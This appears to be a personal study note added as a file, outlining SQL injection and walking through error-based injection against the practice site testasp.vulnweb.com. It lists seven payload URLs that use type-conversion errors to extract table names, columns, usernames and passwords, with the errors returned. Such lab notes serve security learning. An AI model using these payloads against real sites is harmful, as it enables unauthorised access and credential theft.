@@ -1,0 +1,43 @@
+OWASP TOP 10 
+
+1-- SQL INJECTION
+	union based
+	(for php and mysql Database)
+	error based
+	(for asp and MSsql Database)
+	
+	
+	taking an example of http://testasp.vulnweb.com/ for error based injection
+	 
+	*- for the get method ie something= (click on the different on the website)
+
+	1-http://testasp.vulnweb.com/showforum.asp?id=0 and 1=1
+	2-http://testasp.vulnweb.com/showforum.asp?id=0 and 1=convert(int,(select top 1 table_name from information_schema.tables))
+
+		// Conversion failed when converting the nvarchar value 'threads' to data type int.(error is giving the desired answer)
+
+	3-http://testasp.vulnweb.com/showforum.asp?id= 0and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name !='threads'))
+
+		// Conversion failed when converting the nvarchar value 'users' to data type int.
+
+	4-http://testasp.vulnweb.com/showforum.asp?id=0 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name ='users'))
+
+		//Conversion failed when converting the nvarchar value 'uname' to data type int.
+
+	5-http://testasp.vulnweb.com/showforum.asp?id=0 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='users' and column_name!='uname'))
+
+		//Conversion failed when converting the nvarchar value 'upass' to data type int.
+
+	6-http://testasp.vulnweb.com/showforum.asp?id=0 and 1=convert(int,(select top 1 uname from users))
+
+
+	-- 
+	
+	7-http://testasp.vulnweb.com/showforum.asp?id=0 and 1=convert(int,(select top 1 upass from users))
+	
+	
+	none
+
+	just log in and check it working.....
+
+	KAILASH KUMAR
